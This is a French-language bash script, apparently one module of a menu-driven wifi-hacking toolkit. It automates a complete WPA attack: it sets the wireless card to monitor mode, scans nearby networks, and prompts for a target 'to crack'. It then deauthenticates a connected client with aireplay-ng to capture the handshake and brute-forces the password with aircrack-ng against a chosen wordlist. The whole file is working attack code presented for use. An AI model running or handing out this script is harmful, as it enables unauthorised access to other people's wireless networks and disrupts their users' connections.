## Couleurs BASH
DEFAULT="\e[00m"
BLACK="\e[30m"
RED="\e[31m"
GREEN="\e[32m"
ORANGE="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
WHITE="\e[37m"

## Effets de texte (défaut, gras, souligné)
export DEF="\e[0;0m"
export BOLD="\e[1m"
export UNDER="\e[4m"

#interface=`netstat -r | grep "default" | awk {'print $8'}`
eth0=`ifconfig | grep -v -i "ether" | awk {'print $1'} | sed "s/.$//" | grep "eth" | tail -1` > /dev/null 2>&1
wlan0=`ifconfig | awk {'print $1'} | sed "s/.$//" | grep "wlan" | tail -1` > /dev/null 2>&1
IPeth0=`ifconfig $eth0 | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
IPwlan0=`ifconfig $wlan0 | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
if [ -z $wlan0 ];then
	if [ -z $IPeth0 ];then
		interface="lo"
	else
		interface=$eth0
	fi
else
	interface=$wlan0
fi
ipprivee=`ifconfig $interface | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
ippublique=`wget http://checkip.dyndns.org -O - -o /dev/null | cut -d : -f 2 | cut -d \< -f 1` > /dev/null 2>&1
gateway=`ip route | grep "default" | awk {'print $3'}` > /dev/null 2>&1
session=`hostname`
iprange=`ip route | grep "kernel" | awk {'print $1'}` > /dev/null 2>&1
path=`pwd`

ctrl_c() {
echo "" 
echo -e "$RED$BOLD [-]$DEFAULT$CYAN Abandon ... Nettoyage des fichiers créés.$DEFAULT
"
rm $path/../logs/$nom-01.cap > /dev/null 2>&1
echo -e "$RED$BOLD [-]$DEFAULT$CYAN Rétablissement du mode managed de la carte réseau.$DEFAULT
"
airmon-ng stop $monitorWifi > /dev/null 2>&1
echo -e -n "$MAGENTA [>]$CYAN Appuiez sur ENTRÉE pour afficher les options.$DEFAULT"
read -e -p "
" -n 1 -s
cd
cd $path/../
./suite.sh
}

echo -e "$BLUE [...]$CYAN Réactivation des paramètres wifi $DEFAULT"

service network-manager restart

echo -e "$BLUE [...]$CYAN Activation du mode monitor de votre carte Wifi $DEFAULT"
sleep 1

monitorWifi=`airmon-ng start $interface | grep "monitor mode vif" | awk '{print $9}' | sed "s/.\{6\}//" | sed "s/.$//"`

echo -e "$BLUE [...]$CYAN Détection des wifis présents aux alentours. SUIVEZ LES INSTRUCTIONS : $DEFAULT"
sleep 3
echo -e "$ORANGE [!]$CYAN Lorsque vous verrez le nom du wifi que vous voulez craquer, appuiez sur$ORANGE 'CTRL+C'$CYAN. $DEFAULT"
sleep 3
echo -e "$ORANGE [!]$CYAN Vous devrez ensuite rentrer le BSSID et la CHAINE (CH) du wifi en question. $DEFAULT"
sleep 3.5
echo -e -n "$ORANGE [?]$CYAN Avez-vous compris ? Ces messages vont s'effacer. (Appuiez sur entrer pour passer à la suite) $DEFAULT"
read -e -p "
" -n 1 -s

echo -e "$BLUE [...]$CYAN Détection des wifis présents aux alentours : $DEFAULT
"
sleep 1
airodump-ng $monitorWifi

echo -e -n "$MAGENTA [>]$CYAN Entrez le BSSID du wifi à craquer : $DEFAULT"
read bssid

echo -e -n "$MAGENTA [>]$CYAN Entrez la chaine du wifi à craquer : $DEFAULT"
read chaine

echo -e -n "$MAGENTA [>]$CYAN Entrez le nom du fichier de sortie contenant le hash à craquer : $DEFAULT"
read nom

rm $path/../logs/$nom-01.cap > /dev/null 2>&1
rm $path/../logs/$nom-01.csv > /dev/null 2>&1
rm $path/../logs/$nom-01.kismet.csv > /dev/null 2>&1
rm $path/../logs/$nom-01.kismet.netxml > /dev/null 2>&1

echo -e "$BLUE [...]$CYAN Nous allons à présent essayer de récupérer le Handshake. SUIVEZ LES INSTRUCTIONS : $DEFAULT"
sleep 3
echo -e "$ORANGE [!]$CYAN Un second onglet va s'ouvrir, allez y renseigner ce qui est demandé afin de récupérer le Handshake. $DEFAULT"
sleep 3
echo -e "$ORANGE [!]$CYAN Sur la première fenêtre, lorsque vous verrez$ORANGE '[ WPA handshake: ##:##:##:##:##:##'$CYAN sur la ligne du haut, appuiez sur$ORANGE 'CTRL+C'$CYAN. $DEFAULT"
sleep 3.5
echo -e -n "$ORANGE [?]$CYAN Avez-vous compris ? Ce message va s'effacer. (Appuiez sur entrer pour passer à la suite) $DEFAULT"
read -e -p "
" -n 1 -s

gnome-terminal -x sh -c 'echo "\e[35m [>]\e[36m Entrez l adresse MAC de la station à déconnecter (copier de la fenêtre à côté) : \e[00m ";read station;aireplay-ng -0 2 -a $bssid -c $station $monitorWifi;sleep 1;exit' > /dev/null 2>&1 | airodump-ng --bssid $bssid -c $chaine --write $path/../logs/$nom wlan0mon

echo -e -n "$ORANGE [!]$CYAN Vous avez appuié sur$ORANGE 'CTRL+C'$CYAN, le Handsake a-t-il été capturé ? (o/n) : $DEFAULT"
read ouinon

if [ "$ouinon" = "n" ];then
	echo "" 
	echo -e "$RED$BOLD [-]$DEFAULT$CYAN Abandon ... Nettoyage des fichiers créés.$DEFAULT
	"
	rm $path/../logs/$nom-01.cap > /dev/null 2>&1
	echo -e "$RED$BOLD [-]$DEFAULT$CYAN Rétablissement du mode managed de la carte réseau.$DEFAULT
	"
	airmon-ng stop $monitorWifi > /dev/null 2>&1
	echo -e -n "$MAGENTA [>]$CYAN Appuiez sur ENTRER pour afficher la suite : $DEFAULT"
	read -e -p "
	" -n 1 -s
	cd
	cd $path/../
	./suite.sh
fi

echo -e "$GREEN$BOLD [+]$DEFAULT$CYAN Le Handsake a donc été capturé.$DEFAULT
"
sleep 1
echo -e "$MAGENTA [>]$CYAN Nous allons maintenant essayer de craquer le mot de passe du wifi : $DEFAULT
"
sleep 1
wordlist=$(zenity --title "Choisissez la wordlist à utiliser" --filename=$path --file-selection --text "Choisissez la wordlist à utiliser.") > /dev/null 2>&1

sleep 0.8

echo -e "$GREEN$BOLD [+]$DEFAULT$CYAN Lancement de l'attaque ! $DEFAULT
"
sleep 2

aircrack-ng $path/../logs/$nom-01.cap -w $wordlist



sleep 1
rm $path/../logs/$nom-01.cap > /dev/null 2>&1
airmon-ng stop $monitorWifi > /dev/null 2>&1


echo ""
echo -e -n "$MAGENTA [>]$CYAN Appuiez sur ENTRÉE pour afficher les options.$DEFAULT"
read -e -p "
" -n 1 -s



cd
cd $path/../menus/
./wifi.sh
